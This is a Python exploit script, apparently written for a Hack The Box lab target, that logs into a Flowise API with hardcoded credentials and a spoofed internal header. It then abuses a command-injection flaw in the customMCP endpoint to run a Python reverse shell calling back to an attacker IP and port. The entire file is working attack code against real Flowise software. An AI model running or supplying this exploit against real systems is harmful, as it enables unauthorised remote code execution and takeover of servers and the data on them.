import requests
import json
import urllib3

# Suppress insecure request warnings if using proxies later
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Configuration ---
TARGET_URL = 'http://staging.silentium.htb'
EMAIL = 'ben@silentium.htb'
PASSWORD = 'z0nSec!'
KALI_IP = '10.10.16.43'  # Replace with your tun0 IP
KALI_PORT = 9001

s = requests.Session()
s.headers.update({
    'x-request-from': 'internal',
    'Content-Type': 'application/json'
})

print("[*] Authenticating to Flowise API...")
login_resp = s.post(f'{TARGET_URL}/api/v1/auth/login', json={'email': EMAIL, 'password': PASSWORD})

if login_resp.status_code == 200:
    # Extract the JWT required for API endpoints
    token = login_resp.json().get('token')
    s.headers.update({'Authorization': f'Bearer {token}'})
    print("[+] Authentication successful! JWT injected into session.")
else:
    print(f"[-] Authentication failed. Check credentials.\nResponse: {login_resp.text}")
    exit()

# RCE function leveraging the customMCP logic flaw
def rce(cmd):
    print(f"[*] Triggering MCP Command Injection payload...")
    mcp_config = json.dumps({"command": "sh", "args": ["-c", cmd]})
    try:
        s.post(f'{TARGET_URL}/api/v1/node-load-method/customMCP',
            json={
                "loadMethod": "listActions",
                "inputs": {"mcpServerConfig": mcp_config}
            },
            timeout=5) # Expecting a timeout since the shell will hang the connection
    except requests.exceptions.ReadTimeout:
        print("[+] Request timed out. Check your netcat listener for the shell!")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")

# Reverse shell payload (Alpine Linux compatible - no bash)
payload = (
    f"python3 -c 'import socket,subprocess,os;"
    f"s=socket.socket();s.connect((\"{KALI_IP}\",{KALI_PORT}));"
    f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
    f"subprocess.call([\"/bin/sh\",\"-i\"])'"
)

rce(payload)
